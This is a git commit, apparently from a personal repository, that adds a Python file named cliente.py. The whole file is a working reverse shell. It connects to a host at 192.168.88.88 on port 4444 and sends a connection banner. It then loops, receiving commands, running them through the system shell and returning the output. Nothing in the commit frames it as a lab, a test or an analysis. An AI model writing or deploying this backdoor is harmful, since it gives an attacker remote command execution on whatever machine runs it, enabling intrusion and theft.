ec0474c4ef4e3dfa67a1874cd5b8a3c102a10724
erico <91037093+mrx2709@users.noreply.github.com>
2021-12-31 20:26:59 -0300

    Add files via upload

---
+++ cliente.py
@@ -0,0 +1,17 @@
+import socket
+import subprocess
+
+def ejecutar_commando(command):
+    return subprocess.check_output(command, shell=True)
+
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect(("192.168.88.88",4444))
+
+connection.send(b"\n[+] Connection established.\n")
+
+while True:
+    command = connection.recv(1024)
+    command_result = ejecutar_commando(command)
+    connection.send(command_result)
+
+connection.close()
